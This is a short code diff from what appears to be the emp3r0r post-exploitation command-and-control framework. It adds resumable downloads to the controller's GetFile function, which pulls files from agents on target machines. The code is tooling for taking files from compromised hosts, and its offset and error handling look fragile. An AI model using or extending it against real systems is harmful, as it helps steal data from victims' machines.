@@ -13,6 +13,7 @@ import (
 	"github.com/fatih/color"
 	"github.com/jm33-m0/emp3r0r/core/lib/agent"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/posener/h2conn"
 )
 
@@ -39,7 +40,7 @@ const (
 	WWWRoot = Temp + tun.FileAPI
 
 	// FileGetDir where we save #get files
-	FileGetDir = Temp + "file-get/"
+	FileGetDir = "file-get/"
 )
 
 // Control controller interface of a target
@@ -240,7 +241,25 @@ func PutFile(lpath, rpath string, a *agent.SystemInfo) error {
 // GetFile get file from agent
 func GetFile(filepath string, a *agent.SystemInfo) error {
 	var data agent.MsgTunData
-	cmd := fmt.Sprintf("#get %s", filepath)
+
+	// TODO stat target file, know its size, and allocate the file on disk
+
+	// what if we have downloaded part of the file
+	var offset int64 = 0
+	filename := FileGetDir + util.FileBaseName(filepath)
+	if util.IsFileExist(filename + ".downloading") {
+		fiTotal, err := os.Stat(filename + ".downloading")
+		if err != nil {
+			CliPrintWarning("GetFile: read %s: %v", filename, err)
+		}
+		fiHave, err := os.Stat(filename)
+		if err != nil {
+			CliPrintWarning("GetFile: read %s: %v", filename, err)
+		}
+		offset = fiTotal.Size() - fiHave.Size()
+	}
+
+	cmd := fmt.Sprintf("#get %s %d", filepath, offset)
 
 	data.Payload = fmt.Sprintf("cmd%s%s", agent.OpSep, cmd)
 	data.Tag = a.Tag
